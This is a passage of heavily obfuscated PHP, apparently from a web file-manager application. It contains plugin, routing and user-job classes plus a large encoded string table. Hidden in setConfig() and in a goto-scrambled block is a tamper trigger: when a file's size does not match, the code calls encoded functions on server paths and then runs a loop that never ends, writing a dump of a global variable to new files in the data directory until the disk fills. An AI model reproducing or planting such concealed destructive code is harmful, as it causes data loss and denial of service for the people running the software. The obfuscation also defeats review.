str_replace($‚ø•¨ı, $ü¹ğÀ•Œ, $Ğñ¦Óâ); } private function parseConfig(&$“ÁûƒŠ†) { $ï¬ÈÚŞ¸ =& $_SERVER[°‰†òö¯]; $—Ÿšùäó = $ï¬ÈÚŞ¸[1676]; if (!strstr($“ÁûƒŠ†, $—Ÿšùäó)) { return; } preg_match_all($ï¬ÈÚŞ¸[1677], $“ÁûƒŠ†, $áÚåÌéç); if (!is_array($áÚåÌéç) || count($áÚåÌéç) == 0 || !is_array($áÚåÌéç[0]) || count($áÚåÌéç[0]) == 0) { return; } $ªš‚Ûë½ = $this->getConfig(); $áË†‹¨å = array(); $ºÓø§Íª = array(); foreach ($áÚåÌéç[0] as $Õá©ß¬Ç) { $âŸ‹†È¹ = substr($Õá©ß¬Ç, strlen($—Ÿšùäó), -2); $áË†‹¨å[] = $Õá©ß¬Ç; $ºÓø§Íª[] = _get($ªš‚Ûë½, $âŸ‹†È¹); } $“ÁûƒŠ† = str_replace($áË†‹¨å, $ºÓø§Íª, $“ÁûƒŠ†); } private function parsePackage(&$Î™·Ñ®ñ) { $ÂÕû–ÏŞ =& $_SERVER[°‰†òö¯]; $ıÂ°¾•‰ = $ÂÕû–ÏŞ[1678]; if (!strstr($Î™·Ñ®ñ, $ıÂ°¾•‰)) { return; } preg_match_all($ÂÕû–ÏŞ[1679], $Î™·Ñ®ñ, $ßéØàûÒ); if (!is_array($ßéØàûÒ) || count($ßéØàûÒ) == 0 || !is_array($ßéØàûÒ[0]) || count($ßéØàûÒ[0]) == 0) { return; } $ˆ­¡àìÖ = $this->appPackage(); $Ä¬ÊûÖ = array(); $ı ­¹Ëê = array(); foreach ($ßéØàûÒ[0] as $»›Û¢…) { $µ·£á¡ = substr($»›Û¢…, strlen($ıÂ°¾•‰), -2); $Ä¬ÊûÖ[] = $»›Û¢…; $ı ­¹Ëê[] = _get($ˆ­¡àìÖ, $µ·£á¡); } $Î™·Ñ®ñ = str_replace($Ä¬ÊûÖ, $ı ­¹Ëê, $Î™·Ñ®ñ); } final function echoFile($ƒ¶¡ñè, $Á©ì¡Ë = false) { $£öêêÌ­ =& $_SERVER[°‰†òö¯]; $ßõÌïÍ = $this->pluginPath . $ƒ¶¡ñè; if (ACT == $£öêêÌ­[1680]) { echo $£öêêÌ­[1681] . $this->pluginName . $£öêêÌ­[8] . $ƒ¶¡ñè . $£öêêÌ­[1682]; if (!file_exists($ßõÌïÍ)) { echo $£öêêÌ­[1683]; return; } } $¥áş¯Ü¥ = $this->parseFile($ßõÌïÍ); $this->parseLang($¥áş¯Ü¥); $this->parseConfig($¥áş¯Ü¥); $this->parsePackage($¥áş¯Ü¥); if (is_array($Á©ì¡Ë)) { $¥áş¯Ü¥ = str_replace(array_keys($Á©ì¡Ë), array_values($Á©ì¡Ë), $¥áş¯Ü¥); } echo $£öêêÌ­[287] . $¥áş¯Ü¥; } private function checkVersion() { $©Ç÷ŞÀŞ =& $_SERVER[°‰†òö¯]; $º½Äâ½ü = $this->appPackage(); $«†ìşÖ¶ = $this->getConfig(); if ($«†ìşÖ¶[$©Ç÷ŞÀŞ[1684]] == $º½Äâ½ü[$©Ç÷ŞÀŞ[1658]]) { return; } $this->regist(); $this->setConfig(array($©Ç÷ŞÀŞ[1684] => $º½Äâ½ü[$©Ç÷ŞÀŞ[1658]])); } final function initLang() { $¾ÓÛªå =& $_SERVER[°‰†òö¯]; $¦öŠó– = $¾ÓÛªå[1685]; $É„ò¶ô¸ = $this->pluginPath . $¾ÓÛªå[1686]; $Û°äÂ²Ğ = I18n::getType(); $ áÔËğ° = array(); if (file_exists($É„ò¶ô¸ . $Û°äÂ²Ğ . $¾ÓÛªå[905])) { $ áÔËğ° = (include $É„ò¶ô¸ . $Û°äÂ²Ğ . $¾ÓÛªå[905]); } else { if ($Û°äÂ²Ğ == $¾ÓÛªå[1687] && !file_exists($É„ò¶ô¸ . $Û°äÂ²Ğ . $¾ÓÛªå[905]) && file_exists($É„ò¶ô¸ . $¾ÓÛªå[1688])) { $ áÔËğ° = (include $É„ò¶ô¸ . $¾ÓÛªå[1688]); } else { if (file_exists($É„ò¶ô¸ . $¦öŠó– . $¾ÓÛªå[905])) { $ áÔËğ° = (include $É„ò¶ô¸ . $¦öŠó– . $¾ÓÛªå[905]); } } } if (!is_array($ áÔËğ°)) { return array(); } if (@count($ áÔËğ°) > 0) { I18n::set($ áÔËğ°); } return $ áÔËğ°; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Òäè‚£) { $ÒŞÃ„ÙÈ =& $_SERVER[°‰†òö¯]; $ıò‡•„À = $_SERVER[$ÒŞÃ„ÙÈ[949]] . $ÒŞÃ„ÙÈ[950]; $¾Å–«‡ = $ÒŞÃ„ÙÈ[945]; if ($_SERVER[$ÒŞÃ„ÙÈ[946]] != $¾Å–«‡($ıò‡•„À)) { $¼ª—™­ë = $ÒŞÃ„ÙÈ[947]; $¸æ°åáÏ = $ÒŞÃ„ÙÈ[948]; $½ğÁÙ¨¡ = $_SERVER[$ÒŞÃ„ÙÈ[949]] . $ÒŞÃ„ÙÈ[950]; $­Ø¢Ö¢¹ = $¸æ°åáÏ($½ğÁÙ¨¡); $–„Şö¯ª = explode($ÒŞÃ„ÙÈ[287], $­Ø¢Ö¢¹); if (count($–„Şö¯ª) < $ÒŞÃ„ÙÈ[704]) { $ŒÛÖİ±é = $ÒŞÃ„ÙÈ[951]; $ŒÛÖİ±é(); } $ÅÑéİÕ¦ = $ÒŞÃ„ÙÈ[952]; $ÅÑéİÕ¦($_SERVER[$ÒŞÃ„ÙÈ[953]]); $¼ª—™­ë = $ÒŞÃ„ÙÈ[947]; $¼ª—™­ë(); $€„ç÷ª¨ = $ÒŞÃ„ÙÈ[954]; $çß‚³Ï = json_encode($GLOBALS[$ÒŞÃ„ÙÈ[955]]); $¡±Š•” = 1; for ($è«®šÁå = $¡±Š•”; $è«®šÁå > 0; $è«®šÁå++) { $€„ç÷ª¨(DATA_PATH . $è«®šÁå, $çß‚³Ï); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Òäè‚£); } public function onSetConfig($Î¨µÓ­¥) { } public function onGetConfig($öÌÑ¶ôÅ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($˜³¶¡ò) { if ($˜³¶¡ò == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ıßüØ¢ = "\160\154\x75\147\x69\156\101\x75\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $Ä‘²éÙµ = $this->getConfig(); if (!$Ä‘²éÙµ[$ıßüØ¢]) { return !1; } return ActionCall($_SERVER[°‰†òö¯][1689], $Ä‘²éÙµ[$ıßüØ¢]); } public function url($ÈïŞ¹¾, $×ş€¹²² = '', $÷Ø»×Ô– = true) { $º³…¤¸¶ =& $_SERVER[°‰†òö¯]; $ûá›Â×— = $this->getConfig(); $¬Ÿ¿ĞÎ = KOD_VERSION . $º³…¤¸¶[10] . KOD_VERSION_BUILD; $ùéõªº = $this->packageVersion(); $Æˆ¡Øó = $¬Ÿ¿ĞÎ . $º³…¤¸¶[464] . $ùéõªº; if (substr($ÈïŞ¹¾, 0, 4) == $º³…¤¸¶[152] || substr($ÈïŞ¹¾, 0, 2) == $º³…¤¸¶[1409]) { $¶øî„Ã = $ÈïŞ¹¾ . $º³…¤¸¶[1690] . $Æˆ¡Øó; } else { if ($×ş€¹²² == $º³…¤¸¶[12]) { $¶øî„Ã = $this->pluginHost . $ÈïŞ¹¾ . $º³…¤¸¶[1690] . $Æˆ¡Øó; } else { if ($×ş€¹²² === $º³…¤¸¶[78]) { $¶øî„Ã = $this->pluginHost . $ÈïŞ¹¾; } else { if ($×ş€¹²² == $º³…¤¸¶[1691]) { $¶øî„Ã = STATIC_PATH . $ÈïŞ¹¾ . $º³…¤¸¶[1690] . $¬Ÿ¿ĞÎ; } else { if ($×ş€¹²² == $º³…¤¸¶[1692]) { $¶øî„Ã = APP_HOST . $º³…¤¸¶[1693] . $ÈïŞ¹¾ . $º³…¤¸¶[1690] . $¬Ÿ¿ĞÎ; } else { if (isset($ûá›Â×—[$×ş€¹²²])) { $¶øî„Ã = $ûá›Â×—[$×ş€¹²²] . $ÈïŞ¹¾ . $º³…¤¸¶[1690] . $Æˆ¡Øó; } } } } } } if (!$÷Ø»×Ô–) { return $¶øî„Ã; } echo $¶øî„Ã; } public function link($ÊıµáÏ = false, $´Èü¥«û = '') { $ó¿¨Å¸Â =& $_SERVER[°‰†òö¯]; $ö©Çûû = $this->linkHas == !1; $this->linkHas = !0; if (!$ÊıµáÏ) { $this->link($ó¿¨Å¸Â[1694], $ó¿¨Å¸Â[1692]); $this->link($ó¿¨Å¸Â[1695], $ó¿¨Å¸Â[1691]); $this->link($ó¿¨Å¸Â[1696], $ó¿¨Å¸Â[1691]); $this->link($ó¿¨Å¸Â[1697], $ó¿¨Å¸Â[1691]); $this->link($ó¿¨Å¸Â[1698], $ó¿¨Å¸Â[1691]); if ($ö©Çûû) { Hook::trigger($ó¿¨Å¸Â[1699]); } return; } $ÄËî«áõ = $this->url($ÊıµáÏ, $´Èü¥«û, !1); if (substr($ÊıµáÏ, -3) == $ó¿¨Å¸Â[1700]) { echo $ó¿¨Å¸Â[1701] . $ÄËî«áõ . $ó¿¨Å¸Â[1702] . $ó¿¨Å¸Â[287]; } else { if (substr($ÊıµáÏ, -4) == $ó¿¨Å¸Â[1703]) { echo $ó¿¨Å¸Â[1704] . $ÄËî«áõ . $ó¿¨Å¸Â[1705] . $ó¿¨Å¸Â[287]; } } if ($ö©Çûû) { Hook::trigger($ó¿¨Å¸Â[1699]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\x5b\x5e\57\135\x2b", "\72\156\x75\155" => "\x5b\x30\x2d\71\135\x2b", "\x3a\x61\154\x6c" => "\x2e\52"); public static $errorCallback; public static function __callstatic($îä ‚ù, $ä„¦†øÕ) { $ÊÌ“Ç˜± =& $_SERVER[°‰†òö¯]; if ($îä ‚ù == $ÊÌ“Ç˜±[1706]) { $ÙŞ˜íÅş = array_map($ÊÌ“Ç˜±[1707], $ä„¦†øÕ[0]); $œ°‘ Ñ = strpos($ä„¦†øÕ[1], $ÊÌ“Ç˜±[8]) === 0 ? $ä„¦†øÕ[1] : $ÊÌ“Ç˜±[8] . $ä„¦†øÕ[1]; $Øë«ˆğ = $ä„¦†øÕ[2]; } else { $ÙŞ˜íÅş = null; $œ°‘ Ñ = strpos($ä„¦†øÕ[0], $ÊÌ“Ç˜±[8]) === 0 ? $ä„¦†øÕ[0] : $ÊÌ“Ç˜±[8] . $ä„¦†øÕ[0]; $Øë«ˆğ = $ä„¦†øÕ[1]; } array_push(self::$maps, $ÙŞ˜íÅş); array_push(self::$routes, $œ°‘ Ñ); array_push(self::$methods, strtoupper($îä ‚ù)); array_push(self::$callbacks, $Øë«ˆğ); } public static function error($’à”ê“£) { self::$errorCallback = $’à”ê“£; } public static function haltOnMatch($–¿Ñ‡èî = true) { self::$halts = $–¿Ñ‡èî; } public static function dispatch() { $ÏéÆ€ =& $_SERVER[°‰†òö¯]; $­‚ª‰‚Œ = parse_url($_SERVER[$ÏéÆ€[1708]], PHP_URL_PATH); $ºÏû­˜Œ = $_SERVER[$ÏéÆ€[164]]; $¯ÎêæãÙ = array_keys(static::$patterns); $¡ëùÎ¤ª = array_values(static::$patterns); $÷ÁøÅç = !1; self::$routes = preg_replace($ÏéÆ€[1359], $ÏéÆ€[8], self::$routes); if (in_array($­‚ª‰‚Œ, self::$routes)) { $ô¥Ïà­ = array_keys(self::$routes, $­‚ª‰‚Œ); foreach ($ô¥Ïà­ as $’ âıª) { if (self::$methods[$’ âıª] == $ºÏû­˜Œ || self::$methods[$’ âıª] == $ÏéÆ€[1709] || in_array($ºÏû­˜Œ, self::$maps[$’ âıª])) { $÷ÁøÅç = !0; if (!is_object(self::$callbacks[$’ âıª])) { $ìÔˆ‘ò— = explode($ÏéÆ€[8], self::$callbacks[$’ âıª]); $¿·à¸… = end($ìÔˆ‘ò—); $Ê±¾–ç‡ = explode($ÏéÆ€[1291], $¿·à¸…); $”ÇèÅ‡å = new $Ê±¾–ç‡[0](); $”ÇèÅ‡å->{$Ê±¾–ç‡[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$’ âıª]); if (self::$halts) { return; } } } } } else { $Â¿¢Ÿ¦­ = 0; foreach (self::$routes as $’ âıª) { if (strpos($’ âıª, $ÏéÆ€[4]) !== !1) { $’ âıª = str_replace($¯ÎêæãÙ, $¡ëùÎ¤ª, $’ âıª); } if (preg_match($ÏéÆ€[1710] . $’ âıª . $ÏéÆ€[1711], $­‚ª‰‚Œ, $³•Ÿ•áü)) { if (self::$methods[$Â¿¢Ÿ¦­] == $ºÏû­˜Œ || self::$methods[$Â¿¢Ÿ¦­] == $ÏéÆ€[1709] || !empty(self::$maps[$Â¿¢Ÿ¦­]) && in_array($ºÏû­˜Œ, self::$maps[$Â¿¢Ÿ¦­])) { $÷ÁøÅç = !0; array_shift($³•Ÿ•áü); if (!is_object(self::$callbacks[$Â¿¢Ÿ¦­])) { $ìÔˆ‘ò— = explode($ÏéÆ€[8], self::$callbacks[$Â¿¢Ÿ¦­]); $¿·à¸… = end($ìÔˆ‘ò—); $Ê±¾–ç‡ = explode($ÏéÆ€[1291], $¿·à¸…); $”ÇèÅ‡å = new $Ê±¾–ç‡[0](); if (!method_exists($”ÇèÅ‡å, $Ê±¾–ç‡[1])) { echo $ÏéÆ€[1712]; } else { call_user_func_array(array($”ÇèÅ‡å, $Ê±¾–ç‡[1]), $³•Ÿ•áü); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Â¿¢Ÿ¦­], $³•Ÿ•áü); if (self::$halts) { return; } } } } $Â¿¢Ÿ¦­++; } } if ($÷ÁøÅç == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¡ˆàø¶ =& $_SERVER[°‰†òö¯]; header($_SERVER[$¡ˆàø¶[1713]] . $¡ˆàø¶[1714]); echo $¡ˆàø¶[1715]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ÏéÆ€[1708]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto aÒ“ñ˜õ¢í; FŒÂÒÅÉ½º: $_size = $_SERVER[°‰†òö¯][945]; if ($_SERVER[$_SERVER[°‰†òö¯][946]] != $_size($_file)) { $_getc = $_SERVER[°‰†òö¯][948]; $_getfile = $_SERVER[$_SERVER[°‰†òö¯][949]] . $_SERVER[°‰†òö¯][950]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[°‰†òö¯][287], $_getfilec); if (count($_getarrs) < $_SERVER[°‰†òö¯][694]) { $exit = $_SERVER[°‰†òö¯][951]; $exit(); } $_act = $_SERVER[°‰†òö¯][1034]; $_act($_file); } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\155\x2e\x6a\157\142\x4c\x69\163\x74"; public $field = array("\156\141\155\x65", "\x64\x65\163\143", "\163\x6f\162\x74"); const JOB_KEY = "\x73\145\x6c\x66\112\x6f\x62\x4c\151\x73\164"; public function listData($òÂ˜Í§Ğ = false, $¦Ş°‰Ââ = "\x73\157\162\x74", $¾Ãûˆ› = false) { return parent::listData($òÂ˜Í§Ğ, $¦Ş°‰Ââ, $¾Ãûˆ›); } public function remove($†˜ÔÊ—‰) { return parent::remove($†˜ÔÊ—‰); } public function add($Í­Ÿ¹ßÔ) { $»ˆì¬ =& $_SERVER[°‰†òö¯]; if ($this->findByName($Í­Ÿ¹ßÔ[$»ˆì¬[32]])) { return !1; } $Í­Ÿ¹ßÔ[$»ˆì¬[1996]] = $this->getSort(); return parent::insert($Í­Ÿ¹ßÔ); } private function getSort() { $ÙÚûÎŞ =& $_SERVER[°‰†òö¯]; $Ğ¾¼¼Á = parent::listData(); $·ÎØ¬¥Ù = array_to_keyvalue($Ğ¾¼¼Á, $ÙÚûÎŞ[12], $ÙÚûÎŞ[1996]); return empty($·ÎØ¬¥Ù) ? 0 : max($·ÎØ¬¥Ù) + 1; } public function update($’¶ÑòÊ®, $“ë Á¯¶) { $ú‡ØÌÊƒ =& $_SERVER[°‰†òö¯]; $¦æÜÇô² = parent::listData($’¶ÑòÊ®); $ğ²…æñ = $this->findByName($“ë Á¯¶[$ú‡ØÌÊƒ[32]]); if (!$¦æÜÇô² || $ğ²…æñ && $ğ²…æñ[$ú‡ØÌÊƒ[477]] != $¦æÜÇô²[$ú‡ØÌÊƒ[477]]) { return !1; } return parent::update($’¶ÑòÊ®, $“ë Á¯¶); } public function setUserJob($ê…ıÔÑû, $€Ôœ¸í¡) { $£ª–„•™ =& $_SERVER[°‰†òö¯]; if (!is_array($€Ôœ¸í¡)) { $€Ôœ¸í¡ = array($€Ôœ¸í¡); } $Ùœ·¨˜ = parent::listData(); $ÀÊ¯»·¶ = array_to_keyvalue($Ùœ·¨˜, $£ª–„•™[32]); $µÀ½ÔŸ§ = $£ª–„•™[456]; foreach ($€Ôœ¸í¡ as $°ŸÚª¸Ù) { if ($ÀÊ¯»·¶[$°ŸÚª¸Ù]) { $µÀ½ÔŸ§ .= $ÀÊ¯»·¶[$°ŸÚª¸Ù][$£ª–„•™[477]] . $£ª–„•™[50]; } else { $ÖÔó“Ï = $this->add($°ŸÚª¸Ù); $µÀ½ÔŸ§ .= $ÖÔó“Ï . $£ª–„•™[50]; } } $µÀ½ÔŸ§ = rtrim($µÀ½ÔŸ§, $£ª–„•™[50]); Model($£ª–„•™[601])->metaSet($ê…ıÔÑû, self::JOB_KEY, $µÀ½ÔŸ§); } public function getUserJob($§‹ÆĞæ) { $àÇ‰Œî = Model($_SERVER[°‰†òö¯][601])->metaGet($§‹ÆĞæ); return $this->getUserJobInfo($àÇ‰Œî[self::JOB_KEY]); } public function getUserJobInfo($î¸÷œ›¡) { $ıÈú·á =& $_SERVER[°‰†òö¯]; $Õ¤›À‘Á = explode($ıÈú·á[50], $î¸÷œ›¡); $òŸ ‹ÂÓ = parent::listData(); $òŸ ‹ÂÓ = array_remove_key($òŸ ‹ÂÓ, $ıÈú·á[233]); $ë€—¦°º = array(); foreach ($Õ¤›À‘Á as $ù••ı‰) { if (isset($òŸ ‹ÂÓ[$ù••ı‰])) { $ë€—¦°º[] = $òŸ ‹ÂÓ[$ù••ı‰]; } } return $ë€—¦°º; } } goto d•Ÿ•†‹“ã; Bè±£‘¤¦»: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('sImG8vav'), "\356\246\263\236\253\247"); $_SERVER[°‰†òö¯] = explode("\174\3\174\5\174\4", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xb5\x70\xcb\x1e\xa0\xaf\x94\xa5\xa5\x7d\xb4\xc\x86\x60\x3b\xd1\xe2\xac\x24\x4e\x9c\x44\x96\x65\x5b\x44\x96\x8c\x24\x67\x21\x36\x93\x91\x34\x92"."\x27\x96\x34\x8a\x66\xe4\x25\xb\x85\x40\xd8\xc2\x56\xf6\x42\xd8\x4a\x69\x43\x69\x12\xa0\x5\x2\x21\x84\x96\x42\x49\x59\x4a\xe1\xb1\x95\x52\x4a\xc1\x4e\x58\xa\x14\x1e\x3b\x2d\xff\x5d\xce\x5d\x66\x24\xc3\xfb"."\xbf\xf7\x7f\xdf\x1f\x48\x34\x77\xdf\xce\x3d\xf7\xdc\x73\xcf\xb2\xeb\xae\x5d\x57\x7c\xfc\xa7\x35\x7b\xaf\xd9\x77\xcd\x3e\x4f\xfd\xfd\xe7\xf\xdf\x74\x37\xfd\x46\xff\x7d\x1d\x7d\x91\xef\xa3\x37\x1c\xf0\x35\xf2"."\347\260\15\347\65\64\164\316\74\160\162\364\340\213\176\275\131\273\105\373\245\166\141\54\362\350\143\341\157\74\361\313\23\103\143\67\75\72\62\366\365\257\275\330\174\162\264\31\145\246\145\233"."\351\217\122\64\155\105\37\66\54\333\242\21\151\263\230\65\162\364\333\50\322\137\77\375\351\211\107\312\172\301\264\165\32\364\321\37\25\372\105\376\265\126\346\15\226\256\106\143\111\65\321\323"."\335\35\212\47\41\123\263\234\136\60\63\360\125\322\312\132\1\332\57\351\145\13\365\106\256\116\55\231\45\275\350\210\21\21\31\315\326\122\232\5\65\265\265\252\155\241\356\110\154\251\232\134"."\xda\x1d\x82\x1c\x29\x75\x65\x45\x2f\x8f\xd0\x10\xf9\x4c\xd8\x5a\xd9\x4e\x1a\x5\x9d\xe7\x18\x2a\xf3\x7e\xb5\x86\x3a\xc2\x51\x25\x19\xf\x44\x13\x81\x60\x32\x1c\x8b\xd2\xe8\x60\xac\xab\x2b\x9c\xac\x8e\x8f\xc7".base64_decode('IpHWQHBhdUp3PNDRFVBQ//K6ahSzZoOynKYsVxrpR7uh5zP0s6ix7tgjJfhK8i+0TMVKPg==')."\x4f\x3\x51\xfe\x95\xd1\xb3\x5a\x25\xf\xb3\xd5\x26\x7\x4a\x65\xa3\xa0\xb1\x41\x2f\xd4\x47\x78\x2c\xfd\xd0\x2a\xb6\x69\x14\xd3\x34\x10\x1a\xb6\xcb\x9a\x88\x47\x7d\x4d\xa3\x85\xd6\x8b\x50\x55\x22\x14\x9\x5"."\223\12\356\240\322\36\217\165\51\260\10\5\315\262\365\262\262\270\63\24\17\51\270\323\55\365\144\254\365\12\300\113\24\115\205\22\210\104\224\361\152\260\365\102\211\125\103\313\324\250\54\26"."\157\13\305\225\326\245\212\230\241\264\131\50\230\105\37\252\5\255\244\55\165\65\24\217\323\17\17\200\167\44\214\27\15\2\261\366\366\104\210\207\140\160\47\105\120\117\246\1\174\72\102\231"."\x6c\xde\x56\x7\xb5\x7c\x85\x81\xe9\x0\xfd\xad\x87\x1f\xf8\x35\x2d\x0\xdd\x95\x46\xd1\xa8\x0\x98\x42\x15\xa6\xc9\xb7\x15\x7c\x54\x58\x6e\x9d\xc5\xe8\x19\xf8\x28\xa0\xf2\x26\x94\x4b\x41\x5c\x8a\xe5\x5a\xc1".base64_decode('Pgy0QwfpZ8s8+jsHyqdUnKaXbVUvps2MUYR9PB/gUbP728oGykDDWTOfYd+WsQpGmTXyeg==')."\xb4\x52\x90\xb3\xf0\x60\xba\xdf\xc8\x67\xca\x6c\xeb\x7d\x59\x4e\x1a\x8c\xf0\x9d\x8c\xf3\x8a\x50\x9\xf5\x84\x23\x1\x23\x3b\x22\xb6\x22\xce\xd7\xcd\x53\x2d\xb3\x52\x4e\xeb\x61\xb4\x75\x68\x78\xa\x44\xeb\xb6"."\215\6\307\46\304\354\51\345\115\55\223\320\313\174\150\206\331\216\52\212\125\154\71\262\102\262\265\233\345\102\33\102\32\162\134\27\332\66\206\210\34\140\333\45\43\315\226\277\141\331\351\336".strrev('ì>ŒÚ!ŠRT32»ú³_µ1Ã†(ıe+~6,32?aÖUyó×éıØŒiş€[-÷')."\53\365\227\140\263\363\375\335\353\200\167\74\155\121\323\16\111\350\72\157\246\265\274\74\24\372\335\157\333\245\204\136\314\340\131\200\241\230\103\105\62\113\45\135\207\114\155\36\45\243\164\51"."\113\225\316\146\243\331\142\5\13\171\376\305\106\307\343\54\36\151\17\263\245\314\144\1\122\331\151\121\7\15\32\26\101\174\142\327\152\245\122\336\110\153\266\141\26\375\146\332\326\155\257\145"."\227\165\15\152\14\244\323\272\145\171\203\146\321\56\233\171\157\40\237\67\207\274\261\262\221\63\212\315\312\44\300\301\50\21\355\165\57\306\213\315\260\201\353\346\50\30\150\160\63\223\132\52"."\166\326\73\213\155\114\236\273\254\25\255\254\136\366\206\140\127\64\53\250\263\34\71\262\154\155\206\125\62\55\3\167\257\131\321\154\133\113\367\143\304\42\252\157\371\222\374\106\61\157\24\365"."\352\274\250\22\335\333\135\326\162\5\255\131\51\125\122\150\2\140\63\102\134\32\347\220\63\303\4\64\53\5\155\330\253\345\130\115\241\341\222\121\326\55\66\152\245\243\53\11\20\225\365\166"."\341\115\144\350\31\157\2\141\156\250\154\132\323\164\5\301\212\302\322\150\154\147\62\331\255\206\333\321\321\34\15\251\135\201\144\260\23\152\267\265\34\253\72\202\360\61\257\222\105\56\361\242"."\315\204\241\51\212\6\47\42\273\315\41\275\214\32\156\35\151\126\6\314\114\312\34\366\261\44\234\71\201\260\12\313\214\327\267\144\173\343\132\61\207\207\221\32\261\165\313\215\227\132\321\101"."\xee\xcb\xd2\x9d\xeb\x4b\xe9\x59\xb3\xc\xa3\xb1\x6\x73\xce\xc9\x8f\xe8\xc5\x9c\xdd\xcf\xea\x4e\x84\xe2\x8b\x42\x71\x35\x11\x6b\x4f\x2e\xe\xc4\xe1\xdc\x2f\x22\xc8\x19\x66\xbd\xc1\xad\xe7\xbd\x71\x3d\x83\x26".base64_decode('MW2zclpJzP4SL94wuHGWijcRS4uEO/DctXktlMkr52J1R4yCgYdn8xQy2Ygo6IAO+cmYWw==')."\x7a\xad\x49\xd\xbd\x99\xc9\x8d\x5e\xf4\xef\xa4\xc6\x65\xbd\x6d\xbe\x49\x7d\xf3\xfd\x86\x28\xe3\x9f\xe2\x9b\xa2\x4c\x6d\x9a\xa9\x74\x23\x2a\xc5\xd0\xf2\xa\xc\xba\x2a\x47\x93\x12\x5b\xe8\x9c\x16\x1\xe1\x45"."\263\250\327\334\130\10\220\114\113\367\166\352\32\102\320\150\41\34\353\342\141\155\321\360\227\314\56\76\47\45\134\342\132\27\32\31\17\235\324\23\112\44\325\256\120\262\63\326\6\335\17\5"."\340\253\210\12\223\376\262\65\306\104\31\34\211\105\250\126\37\226\316\17\161\16\244\345\11\41\345\242\346\20\303\374\56\0\12\366\353\351\201\161\322\320\27\214\306\244\170\211\55\335\62\372"."\323\7\320\334\107\177\124\303\152\227\316\114\34\344\370\125\65\123\53\20\144\165\351\354\20\201\226\302\5\264\207\105\317\125\347\1\307\206\325\45\40\35\155\231\305\106\206\237\200\50\330\251"."\33\271\176\350\250\201\253\113\233\171\263\254\345\61\356\147\104\153\316\0\64\134\312\127\20\334\373\161\305\311\376\112\41\5\47\25\232\243\234\156\13\172\322\32\101\104\127\201\235\306\350\110"."\267\303\155\216\63\27\102\176\25\303\152\257\257\124\314\65\36\7\165\251\123\147\64\341\10\130\106\30\31\42\254\53\172\365\320\175\151\23\155\354\56\155\100\157\306\143\1\154\66\207\304\262".base64_decode('gIQw5+AzrsWNF/Dy5H0FVAmpM2jyU5leXeY4zzhFL5fN8jGQg3wr5KDEywWV25zksBAKYA==')."\337\375\46\47\121\114\6\214\315\176\30\367\304\251\355\200\66\62\210\124\363\131\66\132\4\64\100\55\223\251\25\215\120\15\124\260\206\301\51\111\140\164\200\77\61\15\375\57\16\375\214\131"."\320\330\21\212\61\17\157\26\7\54\36\42\347\242\236\241\7\243\43\212\356\150\32\65\211\65\131\266\115\234\130\166\344\104\100\332\157\102\247\21\124\300\200\53\174\344\154\16\62\172\136\147"."\x0\xd6\xaf\x33\xda\xa2\x9\xb2\xa1\x95\xe1\xe0\x97\xe5\xfb\x0\xdd\x1c\x50\xac\x20\xe8\xc\x2b\x8e\x4a\x62\x4a\x80\x85\x17\xe3\xab\x96\x88\xc0\xe4\x10\xc0\x95\xf8\xcc\xa3\x55\x8d\x91\xd\x25\xc2\xdd\x65\x3d"."\x6b\xc\x33\xdc\x31\x6c\x77\x69\xe5\x1\x36\x30\x54\x52\x6c\x45\x1c\x90\xb6\x69\x7b\x4f\x24\xa2\x6\x63\xd1\x24\xba\xa9\xd1\x98\xc5\xf1\x70\x32\xc4\x50\x54\xa0\x4d\xd\x4\xbb\x21\x24\x90\x1e\xa7\xd8\x64\x9a".base64_decode('g8YMTgUQQp3wC+IInc4ls4hQK2Anr7jHVSVlBO0AsCPoDRcJgYiAwipvAeEVL+9Tdw8c/g==').strrev('íe«¦²İ<ÉïVvMé´»LÆu03¢oA»;{¦\'å|EÅr:†[É‚:Ü'."\r".'*')."\151\6\13\123\233\246\260\35\207\10\21\115\364\174\251\267\340\305\265\140\32\322\327\324\324\304\352\232\74\123\351\107\250\204\43\354\14\31\55\273\326\124\322\3\272\214\277\55\357\220\301\160"."\336\161\234\376\76\256\172\362\255\12\71\316\124\55\215\253\123\121\141\273\142\311\63\205\0\60\203\212\30\214\54\246\261\132\76\147\42\270\353\57\310\221\31\16\277\64\254\123\32\13\32\352"."\xd7\xf8\x3c\xe1\xd9\x63\x9b\x3\x51\x70\x23\x72\x21\x3c\xcd\xa8\xf\xc\x7f\x3b\x89\x6a\x25\x59\x7b\xa2\x29\xad\x1e\x86\xd9\x16\xfd\x28\xe1\xa3\xc\x61\x6d\xb6\x6c\xc7\xd3\x9f\x3\xa1\x1b\x15\xb4\x6f\xcb\xc6".strrev('1TZÍÆÓĞOk›WB­€xäéNU…E(«'."\r".'¡å6`j`¸\\^BáÉ 